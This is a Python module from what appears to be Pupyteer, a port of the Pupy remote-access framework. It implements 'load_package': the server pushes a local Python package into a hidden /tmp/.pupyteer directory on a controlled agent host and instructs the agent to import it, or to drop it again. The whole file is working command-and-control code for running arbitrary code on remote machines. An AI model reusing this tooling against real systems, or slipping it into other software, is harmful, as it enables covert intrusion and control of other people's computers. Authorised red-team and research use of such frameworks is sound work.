"""Built-in Pupyteer modules — package loading (load_package).

Upstream Pupy's ``load_package`` ships a Python package to the agent and
imports it. Pupyteer reimplements this on top of the existing fs_put
transfer primitive: the server reads the package from a local ``packages/``
directory and pushes it to the agent, then asks the agent to import it.

This is the foundation that unblocks the PY_DEP modules that depend on
Pupy's agent-side remote packages (pupyps, pupyutils, ...): once a package
is loaded, modules that need it can be ported.
"""
from __future__ import annotations

import os
from typing import Any, Dict

from pupyteer.server.core.config import ConfigManager
from pupyteer.server.core.logging import AuditLogger
from pupyteer.server.modules.registry import PupyModule, ModuleCategory, ModuleRequirement
from pupyteer.server.sessions import transfer
from pupyteer.server.modules.builtin.recon import (
    _command_timeout,
    _no_agent,
)

DEFAULT_PACKAGES_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))),
    "packages",
)


class LoadPackageModule(PupyModule):
    name = "load_package"
    version = "1.0.0"
    description = "Load a Python package onto the agent"
    author = "Pupyteer Team"
    category = ModuleCategory.EXECUTION

    async def execute(self, session, args):
        package = str(args.get("package") or args.get("name") or "").strip()
        if not package:
            return {"status": "error", "error": "package argument is required"}

        force = bool(args.get("force", False))
        remove = bool(args.get("remove", False))
        dll = bool(args.get("dll", False))
        if dll:
            return {"status": "error", "error": "dll loading is not supported by this agent"}

        session_mgr = getattr(self, "_session_manager", None)
        if not session_mgr:
            return _no_agent(session)

        if remove:
            # Invalidate: ask the agent to drop the module
            reply = await transfer.run_action(
                session_mgr, session.session_id,
                {"action": "load_package", "name": package, "path": "", "force": True, "remove": True},
                timeout=_command_timeout(args))
            return {"status": reply.get("status", "ok"), "package": package, "reply": reply}

        # Locate the package locally
        packages_dir = self.config.get("packages.dir", DEFAULT_PACKAGES_DIR)
        candidate = os.path.join(packages_dir, package + ".py")
        if not os.path.isfile(candidate):
            # Try as a directory package
            init = os.path.join(packages_dir, package, "__init__.py")
            if os.path.isfile(init):
                candidate = init
            else:
                return {"status": "error", "error": f"package not found locally: {candidate}"}

        with open(candidate, "rb") as f:
            data = f.read()

        remote_path = f"/tmp/.pupyteer/pkg/{package}.py"
        pushed = await transfer.push(session_mgr, session.session_id, candidate, remote_path,
                                   timeout=_command_timeout(args))
        if pushed.get("error") or pushed.get("status") == "error":
            return {"status": "error", "error": pushed.get("error", "push failed"), "package": package}

        reply = await transfer.run_action(
            session_mgr, session.session_id,
            {"action": "load_package", "name": package, "path": remote_path, "force": force},
            timeout=_command_timeout(args))
        if reply.get("error") or reply.get("ok") is False:
            return {"status": "error", "error": reply.get("error", "import failed"), "package": package}
        return {"status": "ok", "package": package, "path": remote_path, "reply": reply}

    def validate_args(self, args):
        if not (args.get("package") or args.get("name")):
            return ["Missing required argument: package"]
        return []
